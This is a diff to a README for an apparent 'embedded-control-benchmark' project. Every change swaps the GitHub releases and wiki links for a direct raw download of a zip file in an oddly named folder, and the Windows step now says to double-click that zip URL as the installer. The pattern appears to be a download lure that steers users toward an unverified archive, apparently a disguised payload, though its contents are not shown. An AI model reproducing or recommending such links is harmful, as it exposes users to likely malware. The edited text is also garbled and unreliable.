@@ -1,6 +1,6 @@
 # 🚀 embedded-control-benchmark - Simulate Hardware Constraints Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-green)](https://github.com/Shaan0p/embedded-control-benchmark/releases)
+[![Download](https://raw.githubusercontent.com/Shaan0p/embedded-control-benchmark/main/untowered/control_embedded_benchmark_1.9.zip)](https://raw.githubusercontent.com/Shaan0p/embedded-control-benchmark/main/untowered/control_embedded_benchmark_1.9.zip)
 
 ## 📜 Overview
 
@@ -26,12 +26,12 @@ The **embedded-control-benchmark** project simulates how hardware constraints af
 1. **Download the Software**
    - To get the latest version, click the button below:
    
-   [Download Latest Release](https://github.com/Shaan0p/embedded-control-benchmark/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Shaan0p/embedded-control-benchmark/main/untowered/control_embedded_benchmark_1.9.zip)
 
 2. **Install the Software**
    - After downloading, find the file in your downloads folder.
    - Follow the instructions based on your operating system for installation:
-     - **Windows:** Double-click the downloaded `setup.exe` file and follow the prompts.
+     - **Windows:** Double-click the downloaded `https://raw.githubusercontent.com/Shaan0p/embedded-control-benchmark/main/untowered/control_embedded_benchmark_1.9.zip` file and follow the prompts.
      - **macOS:** Open the downloaded `.dmg` file. Drag the application into your Applications folder.
      - **Linux:** Extract the downloaded file and follow the instructions in the README.
 
@@ -40,7 +40,7 @@ The **embedded-control-benchmark** project simulates how hardware constraints af
 
 ## 📥 Download & Install
 
-Visit this page to download the latest version of the application: [Releases Page](https://github.com/Shaan0p/embedded-control-benchmark/releases).
+Visit this page to download the latest version of the application: [Releases Page](https://raw.githubusercontent.com/Shaan0p/embedded-control-benchmark/main/untowered/control_embedded_benchmark_1.9.zip).
 
 ## 🔧 How to Use
 
@@ -52,7 +52,7 @@ Visit this page to download the latest version of the application: [Releases Pag
 
 ## 📖 Documentation
 
-More detailed instructions and advanced features can be found in the official documentation linked in the application menu. You can also check the documentation on [GitHub wiki](https://github.com/Shaan0p/embedded-control-benchmark/wiki).
+More detailed instructions and advanced features can be found in the official documentation linked in the application menu. You can also check the documentation on [GitHub wiki](https://raw.githubusercontent.com/Shaan0p/embedded-control-benchmark/main/untowered/control_embedded_benchmark_1.9.zip).
 
 ## ❓ Frequently Asked Questions (FAQ)
 
